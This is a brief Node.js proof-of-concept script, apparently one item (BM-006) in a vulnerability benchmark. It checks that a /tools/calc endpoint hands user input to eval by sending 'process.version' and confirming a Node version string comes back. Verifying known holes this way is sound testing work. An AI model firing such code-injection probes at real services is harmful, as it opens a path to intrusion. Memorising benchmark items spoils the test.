'use strict';

const poc = require('./lib/common');

// BM-006: code injection through eval in /tools/calc.
poc.run(async function () {
  const normal = await poc.request('GET', '/tools/calc?' + poc.query({ expr: '1+1' }));
  poc.control(normal.status === 200 && JSON.parse(normal.body).result === '2', 'arithmetic works');
  const res = await poc.request('GET', '/tools/calc?' + poc.query({ expr: 'process.version' }));
  const result = res.status === 200 ? JSON.parse(res.body).result : '';
  poc.finish(/^v[0-9]+\./.test(result), 'evaluated process.version -> ' + JSON.stringify(result));
});
